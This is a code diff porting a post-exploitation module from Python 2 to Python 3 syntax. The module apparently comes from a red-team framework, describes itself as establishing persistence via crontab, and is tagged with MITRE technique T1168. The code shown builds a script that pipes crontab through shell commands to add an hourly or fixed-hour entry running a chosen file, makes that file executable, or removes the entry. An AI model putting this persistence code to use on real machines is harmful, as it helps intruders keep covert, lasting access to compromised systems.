@@ -1,4 +1,5 @@
-class Module:
+from builtins import object
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -12,6 +13,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': 'This module establishes persistence via crontab',
+
+            'Software': '',
+
+            'Techniques': ['T1168'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -99,24 +104,23 @@ Hour = "%s"
 
 if Remove == "True":
     cmd = 'crontab -l | grep -v "%s"  | crontab -'
-    print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
-    print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
-    print "Finished"
+    print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
+    print(subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read())
+    print("Finished")
 
 else:
     if Hourly == "True":
         cmd = 'crontab -l | { cat; echo "0 * * * * %s"; } | crontab -'
-        print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
-        print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
-        print subprocess.Popen('chmod +x %s', shell=True, stdout=subprocess.PIPE).stdout.read()
-        print "Finished"
+        print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
+        print(subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read())
+        print(subprocess.Popen('chmod +x %s', shell=True, stdout=subprocess.PIPE).stdout.read())
+        print("Finished")
 
     elif Hour:
             cmd = 'crontab -l | { cat; echo "0 %s * * * %s"; } | crontab -'
-            print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
-            print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
-            print subprocess.Popen('chmod +x %s', shell=True, stdout=subprocess.PIPE).stdout.read()
-            print "Finished"
-
+            print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
+            print(subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read())
+            print(subprocess.Popen('chmod +x %s', shell=True, stdout=subprocess.PIPE).stdout.read())
+            print("Finished")
 """ % (Remove, Hourly, Hour, FileName, FileName, FileName, Hour, FileName, FileName)
         return script
